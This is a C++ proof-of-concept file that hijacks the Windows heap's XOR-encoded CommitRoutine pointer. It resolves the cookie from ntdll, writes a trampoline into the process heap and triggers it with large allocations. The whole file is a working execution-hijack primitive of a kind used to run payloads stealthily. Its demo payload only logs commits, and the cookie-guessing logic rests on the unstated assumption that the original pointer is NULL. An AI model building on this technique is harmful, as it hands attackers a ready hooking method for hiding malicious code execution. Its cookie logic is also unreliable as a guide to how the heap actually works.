/*
 * heapcommit — Heap CommitRoutine Hijack PoC
 *
 * Every Windows HEAP struct has a CommitRoutine function pointer at offset +0x168.
 * It fires when the heap manager commits new memory for a growing segment.
 * The pointer is XOR-encoded with a cookie in ntdll's .data section.
 *
 * This PoC:
 *   1. Reads the process heap from PEB
 *   2. Resolves the XOR cookie by scanning ntdll .data
 *   3. Encodes a trampoline and writes it to HEAP+0x168
 *   4. Large allocations trigger the trampoline
 *   5. Restores original on cleanup
 *
 * Heap struct is RW — direct write, no protection change needed.
 *   cl /std:c++20 /EHsc heapcommit.cpp /link ntdll.lib
 */

#include <Windows.h>
#include <cstdint>
#include <cstring>
#include <atomic>
#include <format>
#include <iostream>
#include <vector>

extern "C" NTSTATUS NTAPI NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

using namespace std;

static constexpr size_t HEAP_COMMIT_ROUTINE_OFFSET = 0x168;
static constexpr size_t HEAP_FLAGS_OFFSET = 0x070;

using PayloadFn = void (*)(PVOID heapBase, PVOID commitAddr, SIZE_T commitSize);

struct HeapCommitEngine {
	PVOID heap = nullptr;
	HMODULE ntdll = nullptr;
	uint64_t cookie = 0;
	uint64_t originalEncoded = 0;
	PayloadFn payload = nullptr;
	atomic<int32_t> triggers{0};
	atomic<bool> armed{false};
};

static HeapCommitEngine g_engine;

static NTSTATUS NTAPI TrampolineCommitRoutine(PVOID heapBase, PVOID* commitAddress, PSIZE_T commitSize)
{
	if (g_engine.armed.load() && g_engine.payload)
		g_engine.payload(heapBase, commitAddress ? *commitAddress : nullptr, commitSize ? *commitSize : 0);

	g_engine.triggers.fetch_add(1);
	return NtAllocateVirtualMemory(GetCurrentProcess(), commitAddress, 0, commitSize, MEM_COMMIT, PAGE_READWRITE);
}

static bool ResolveCookie()
{
	auto* base = reinterpret_cast<uint8_t*>(g_engine.ntdll);
	auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
	auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
	auto* sec = IMAGE_FIRST_SECTION(nt);

	uint8_t* data = nullptr;
	size_t dataSize = 0;

	for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
		if (memcmp(sec[i].Name, ".data", 5) == 0) {
			data = base + sec[i].VirtualAddress;
			dataSize = sec[i].Misc.VirtualSize;
			break;
		}
	}

	if (!data)
		return false;

	auto encoded = *reinterpret_cast<uint64_t*>(reinterpret_cast<uint8_t*>(g_engine.heap) + HEAP_COMMIT_ROUTINE_OFFSET);

	auto* scan = reinterpret_cast<uint64_t*>(data);
	for (size_t i = 0; i < dataSize / 8; ++i) {
		if (scan[i] == encoded) {
			g_engine.cookie = scan[i];
			return true;
		}
	}

	g_engine.cookie = encoded;
	return true;
}

static void DumpHeapState(const char* label)
{
	auto* h = reinterpret_cast<uint8_t*>(g_engine.heap);
	auto flags = *reinterpret_cast<uint32_t*>(h + HEAP_FLAGS_OFFSET);
	auto encoded = *reinterpret_cast<uint64_t*>(h + HEAP_COMMIT_ROUTINE_OFFSET);
	auto isNull = (encoded == g_engine.cookie);
	auto decoded = isNull ? 0ULL : (encoded ^ g_engine.cookie);

	cout << format("  [{}]\n", label)
	     << format("    ProcessHeap:  0x{:016X}\n", reinterpret_cast<uintptr_t>(g_engine.heap))
	     << format("    Flags:        0x{:08X}\n", flags)
	     << format("    Cookie:       0x{:016X}\n", g_engine.cookie)
	     << format("    HEAP[0x168]:  0x{:016X}\n", encoded)
	     << format("    Decoded:      0x{:016X}{}\n", decoded, isNull ? "  (NULL — not set)" : "");
}

static bool Arm()
{
	auto encoded = reinterpret_cast<uint64_t>(&TrampolineCommitRoutine) ^ g_engine.cookie;
	auto* target = reinterpret_cast<uint64_t*>(reinterpret_cast<uint8_t*>(g_engine.heap) + HEAP_COMMIT_ROUTINE_OFFSET);
	g_engine.originalEncoded = *target;
	*target = encoded;
	g_engine.armed.store(true);
	return true;
}

static void Disarm()
{
	if (!g_engine.armed.load())
		return;
	auto* target = reinterpret_cast<uint64_t*>(reinterpret_cast<uint8_t*>(g_engine.heap) + HEAP_COMMIT_ROUTINE_OFFSET);
	*target = g_engine.originalEncoded;
	g_engine.armed.store(false);
}

static void OnCommit(PVOID heapBase, PVOID commitAddr, SIZE_T commitSize)
{
	auto n = g_engine.triggers.load() + 1;
	if (n <= 3)
		cout << format("    [COMMIT] #{} heap=0x{:X} addr=0x{:X} size=0x{:X}\n",
		               n, reinterpret_cast<uintptr_t>(heapBase), reinterpret_cast<uintptr_t>(commitAddr), commitSize);
}

int main()
{
	cout << "  heapcommit \xe2\x80\x94 Heap CommitRoutine Hijack PoC\n"<< endl;

	g_engine.ntdll = GetModuleHandleW(L"ntdll.dll");
	g_engine.heap = GetProcessHeap();
	g_engine.payload = OnCommit;

	if (!g_engine.ntdll || !g_engine.heap) {
		cerr << "[!] failed to get ntdll/heap\n";
		return 1;
	}

	cout << format("[*] ntdll: 0x{:X}\n\n", reinterpret_cast<uintptr_t>(g_engine.ntdll));

	if (!ResolveCookie()) {
		cerr << "[!] cookie resolution failed\n";
		return 1;
	}

	DumpHeapState("BEFORE");

	cout << "\n[*] Arming...\n";
	Arm();
	cout << "[+] CommitRoutine hijacked\n\n";
	DumpHeapState("ARMED");

	cout << "\n[*] Triggering heap growth (64 large allocs)...\n";
	vector<void*> blocks;
	for (int i = 0; i < 64; ++i) {
		auto* p = HeapAlloc(GetProcessHeap(), 0, 0x10000 + i * 0x1000);
		if (p)
			blocks.push_back(p);
	}
	for (auto* p : blocks)
		HeapFree(GetProcessHeap(), 0, p);

	cout << format("\n[*] CommitRoutine fired {} time(s)\n\n", g_engine.triggers.load());

	Disarm();
	cout << "[+] Disarmed\n\n";
	DumpHeapState("RESTORED");

	cout << "\n============================================================\n"
	     << format("  Total triggers: {}\n", g_engine.triggers.load())
	     << "============================================================\n";

	return 0;
}
